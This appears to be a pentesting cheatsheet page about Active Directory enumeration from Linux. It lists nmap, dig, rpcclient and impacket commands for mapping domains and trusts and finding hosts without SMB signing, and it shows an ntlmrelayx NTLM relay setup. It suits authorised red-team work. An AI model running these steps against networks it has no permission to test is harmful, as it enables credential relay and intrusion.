---
layout: post
title: TA0007 Discovery - AD Enumeration with Linux System
parent: Pentesting
category: Pentesting
grand_parent: Cheatsheets
modified_date: 2021-12-10
permalink: /:categories/:title/
---

<!-- vscode-markdown-toc -->
* [Great ressources](#Greatressources)
* [ENUM: DOMAIN AND IP PLAN](#ENUM:DOMAINANDIPPLAN)
* [RELAY/POISON](#RELAYPOISON)
* [SMBv2 SIGNING NOT REQUIRED](#SMBv2SIGNINGNOTREQUIRED)
* [CRACKING HASHES](#CRACKINGHASHES)
* [Docker Impacket RPCdump](#DockerImpacketRPCdump)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

## <a name='Greatressources'></a>Great ressources
```sh
| **Ressource**  | **Description** |    **Author**    |
|-----------------|-----------------|------------------|
| [Fun with LDAP & Kerberos - ThotCon 2017](https://github.com/jomivz/cybrary/blob/master/purpleteam/red/windows/LDAP%20Service%20and%20Kereberos%20Protocol%20Attacks.pdf) | AD Enumeration on Linux OS. [YT](https://www.youtube.com/watch?v=2Xfd962QfPs) | Ronnie Flathers |
| [RPCclient cookbook](https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html) | | |
| [Other LDAP queries examples](https://theitbros.com/ldap-query-examples-active-directory/) | | |
| [Other LDAP queries examples](https://posts.specterops.io/an-introduction-to-manual-active-directory-querying-with-dsquery-and-ldapsearch-84943c13d7eb) | | specterops |


```

## <a name='ENUM:DOMAINANDIPPLAN'></a>ENUM: DOMAIN AND IP PLAN
```sh
# OBJECTIVE 1: Identify the DHCP server 
nmap --script broadcast-dhcp-discover
sudo tcpdump -ni eth0 udp port 67 and port 68

dig -t SRV _gc._tcp.contoso.com
dig -t SRV _ldap._tcp.contoso.com
dig -t SRV _kerberos._tcp.contoso.com
dig -t SRV _kpasswd._tcp.contoso.com

nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='contoso.com'"

nbtscan -r 10.0.0.0/24

# OBJECTIVE 1: Enum domains and trusts with authenticated user - DC IP address 
rpcclient -U "johndoe" 10.1.1.1
rpcclient> enumdomains
rpcclient> enumtrusts
# Copy the output to trusts.txt

# OBJECTIVE 2: GET THE IP SUBNETTING / IP PLAN
# 2A DNS resolutions
cut -f1 -d" " trusts.txt > trusts_clean.txt                                                        │
for i in `cat trusts_clean.txt`; do ping -a $i; done                                               │

```
## <a name='RELAYPOISON'></a>RELAY/POISON

## <a name='SMBv2SIGNINGNOTREQUIRED'></a>SMBv2 SIGNING NOT REQUIRED
```sh
# STEP 1: find smb not signed
nmap -p 445 --script smb2-security-mode 10.0.0.0/24 -o output.txt

# STEP 2: set up impacket/ntlmrelayx
grep -B 9 "not required" output.txt |sed -E '/.*\((.*\..*\..*\..*)\)$/!d' |sed -E 's/.*\((.*\..*\..*\..*)\)$/\1/' > targets.txt
python3 ntlmrelayx.py -tf targets.txt -smb2support

```

## <a name='CRACKINGHASHES'></a>CRACKING HASHES
```sh
# Get the domain pasword policy
rpcclient -U "johndoe" 10.1.1.1
rpcclient> getdompwinfo
```

## <a name='DockerImpacketRPCdump'></a>Docker Impacket RPCdump
```
sudo docker run --rm -it -p 134:135 rflathers/impacket rpcdump.py -port 135 1.3.8.3 > rpcdump_10.3.8.3.txt
```